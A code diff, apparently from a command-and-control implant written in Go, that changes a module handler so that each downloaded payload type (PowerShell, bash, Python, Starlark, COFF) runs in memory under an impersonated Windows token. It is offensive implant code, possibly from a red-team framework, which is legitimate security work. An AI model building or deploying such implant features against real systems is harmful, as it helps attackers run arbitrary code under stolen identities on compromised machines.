@@ -41,33 +41,68 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
-		out, err := agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
+		err = executeWithToken(invocation.Token, func() error {
+			var execErr error
+			out, execErr = agentutils.ExecutePowerShell(payload_data, invocation.Argv, nil)
+			if execErr != nil {
+				out = logging.Sprintf("running powershell script: %s (%v)", out, execErr)
+			}
+			return nil // output already captured; don't mask with token error
+		})
 		if err != nil {
-			return logging.Sprintf("running powershell script: %s (%v)", out, err)
+			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
 	case "bash":
-		out, err := agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
+		err = executeWithToken(invocation.Token, func() error {
+			var execErr error
+			out, execErr = agentutils.ExecuteShell(payload_data, invocation.Argv, nil)
+			if execErr != nil {
+				out = logging.Sprintf("running shell script: %s (%v)", out, execErr)
+			}
+			return nil
+		})
 		if err != nil {
-			return logging.Sprintf("running shell script: %s (%v)", out, err)
+			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
 	case "python":
-		out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
+		err = executeWithToken(invocation.Token, func() error {
+			var execErr error
+			out, execErr = agentutils.ExecutePython(payload_data, invocation.Argv, nil)
+			if execErr != nil {
+				out = logging.Sprintf("running python script: %s (%v)", out, execErr)
+			}
+			return nil
+		})
 		if err != nil {
-			return logging.Sprintf("running python script: %s (%v)", out, err)
+			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
 	case "starlark":
-		out, err := script.Run(payload_data, invocation.Argv, nil)
+		err = executeWithToken(invocation.Token, func() error {
+			var execErr error
+			out, execErr = script.Run(payload_data, invocation.Argv, nil)
+			if execErr != nil {
+				out = logging.Sprintf("running starlark module: %v", execErr)
+			}
+			return nil
+		})
 		if err != nil {
-			return logging.Sprintf("running starlark module: %v", err)
+			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
 	case "coff":
-		out, err := runCOFFModule(payload_data, invocation)
+		err = executeWithToken(invocation.Token, func() error {
+			var execErr error
+			out, execErr = runCOFFModule(payload_data, invocation)
+			if execErr != nil {
+				out = logging.Sprintf("running COFF module: %v", execErr)
+			}
+			return nil
+		})
 		if err != nil {
-			return logging.Sprintf("running COFF module: %v", err)
+			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
 	default:
